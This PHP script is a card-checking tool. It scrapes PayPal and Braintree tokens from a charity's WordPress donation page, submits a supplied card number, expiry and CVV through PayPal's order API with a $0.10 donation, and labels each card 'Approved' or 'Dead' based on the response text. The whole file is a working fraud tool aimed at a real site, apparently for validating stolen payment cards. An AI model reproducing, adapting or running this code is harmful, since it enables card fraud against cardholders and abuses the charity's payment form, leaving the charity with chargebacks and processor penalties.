<?php


function getStr($str, $startDelimiter, $endDelimiter) {
    $startDelimiterLength = strlen($startDelimiter);
    $startPos = strpos($str, $startDelimiter);
    if ($startPos === false) {
        return '';
    }
    $startPos += $startDelimiterLength;
    $endPos = strpos($str, $endDelimiter, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($str, $startPos, $endPos - $startPos);
}


function checkcharge($cc, $mes, $ano, $cvv) {


if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://voyagercharity.com/pdonate/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: voyagercharity.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control: max-age=0',
    'if-modified-since: Thu, 28 Nov 2024 08:30:22 GMT',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
]);

$r1 = curl_exec($ch);

curl_close($ch);

curl_close($ch);
 $clientToken = getStr($r1, '<script data-namespace="wpforms_paypal_single" data-client-token="', '"');
 $nonce = getStr($r1, '"nonces":{"create":"', '",');
$Xtoken = getStr($r1, 'data-token="', '"');
 

$decoded = base64_decode($clientToken);
$data = json_decode($decoded, true);
 
   $bearer1 = $data['braintree']['authorizationFingerprint'];
   $bearer = $data['paypal']['accessToken'];
$ch = curl_init();


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://voyagercharity.com/wp-admin/admin-ajax.php?action=wpforms_paypal_commerce_create_order');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: voyagercharity.com',
    'accept: */*',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryVJ7SQieaJyIR6puB',
    'origin: https://voyagercharity.com',
    'referer: https://voyagercharity.com/pdonate/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][3][first]"

badboy
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][3][last]"

Chk
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][5]"

badboychx1@gmail.com
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpf-temp-wpforms[fields][18]"

(304) 975-8798
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][18]"

+13049758798
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][19]"

1
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][10]"

0.10
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][12]"

$0.10
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][21][orderID]"


------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][21][subscriptionID]"


------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][21][source]"


------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[fields][21][cardname]"

badboy
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[id]"

1014
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="page_title"

Paypal
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="page_url"

https://voyagercharity.com/pdonate/
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="page_id"

1022
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="wpforms[post_id]"

1022
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="total"

0.1
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="is_checkout"

false
------WebKitFormBoundaryVJ7SQieaJyIR6puB
Content-Disposition: form-data; name="nonce"

'.$nonce.'
------WebKitFormBoundaryVJ7SQieaJyIR6puB--');

$r2 = curl_exec($ch);

curl_close($ch);

 $data = json_decode($r2, true);
 $token = $data['data']['id'];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cors.api.paypal.com/v2/checkout/orders/'.$token.'/confirm-payment-source');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: cors.api.paypal.com',
    'accept: */*',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization: Bearer '.$bearer.'',
    'braintree-sdk-version: 3.32.0-payments-sdk-dev',
    'content-type: application/json',
    'origin: https://assets.braintreegateway.com',
    'paypal-client-metadata-id: 5bc4d7cd0977f185e51fa669c96aa5e8',
    'referer: https://assets.braintreegateway.com/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_source":{"card":{"number":"'.$cc.'","expiry":"'.$ano.'-'.$mes.'","security_code":"'.$cvv.'","name":"badboy","attributes":{"verification":{"method":"SCA_WHEN_REQUIRED"}}}},"application_context":{"vault":false}}');

 $r3 = curl_exec($ch);

curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://voyagercharity.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: voyagercharity.com',
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryhCAnOOZUJ6blBWdi',
    'origin: https://voyagercharity.com',
    'referer: https://voyagercharity.com/pdonate/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][3][first]"

badboy
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][3][last]"

Chk
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][5]"

badboychx1@gmail.com
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][18]"

+13049758798
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][19]"

1
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][10]"

0.10
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][12]"

$0.10
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][21][orderID]"

'.$token.'
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][21][subscriptionID]"


------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][21][source]"


------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[fields][21][cardname]"

badboy
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[id]"

1014
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="page_title"

Paypal
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="page_url"

https://voyagercharity.com/pdonate/
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="page_id"

1022
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[post_id]"

1022
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="wpforms[token]"

'.$Xtoken.'
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="action"

wpforms_submit
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="start_timestamp"

1732802180996
------WebKitFormBoundaryhCAnOOZUJ6blBWdi
Content-Disposition: form-data; name="end_timestamp"

1732802217781
------WebKitFormBoundaryhCAnOOZUJ6blBWdi--');

 $result = curl_exec($ch);

curl_close($ch);
 $msg = getStr($result, 'This payment cannot be processed because', '.');

if (strpos($result, ' customer authentication')){
    return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    }
        elseif (strpos($result, 'Thank You for Your Generosity!')){
    return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved  Response: Charged $0.1";
    
    }
    
     elseif(strpos($result, "Your card has insufficient funds.") || strpos($result, "insufficient_funds")) {
   
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    } elseif(strpos($result, 'security code is incorrect.') !== false || strpos($result, 'security code is invalid.') !== false || strpos($result, "incorrect_cvc") !== false) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    } elseif(strpos($result, "Invalid account.")) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    } elseif(strpos($result, "Your card does not support this type of purchase.")) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    } elseif(strpos($result, "stripe_3ds2_fingerprint")) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    }
     elseif (strpos($r3, 'PAYER_CANNOT_PAY')) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Dead PAYER_CANNOT_PAY";
    }
    elseif (strpos($result, 'Your card was declined')) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Dead ";
    } else {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Dead $msg";
    }
}


